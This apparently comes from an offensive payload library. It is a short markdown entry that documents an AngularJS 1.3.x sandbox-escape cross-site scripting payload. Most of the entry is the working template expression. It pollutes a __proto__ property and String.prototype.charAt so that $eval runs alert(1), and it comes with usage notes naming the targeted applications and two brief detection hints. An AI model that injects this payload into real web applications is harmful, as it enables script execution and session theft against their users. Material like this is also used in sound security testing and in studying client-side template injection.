---
type: code
language: JavaScript
verified: true
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
tags:
  - xss
  - proto-pollution
  - angularjs
platforms:
  - Web
validated: true
---

# AngularJS-Object-Assign-Proto-Pollution

## Code

```javascript
{{{}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join;
  'a'.constructor.prototype.charAt=[].join;
  $eval('x=alert(1)//');  }}
```

## Description

Pollutes Object.assign and charAt via __proto__ for $eval alert in AngularJS 1.3.3-1.3.18.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| None | Chained pollution technique. | N/A |

## Usage

For apps using Object.assign in templates.

## Detection

- assign method overwrites.
- Multi-step pollution logs.

## Related

- [[procedures/Angular-AngularJS-Stored-Reflected-XSS-Simple-Alert]]
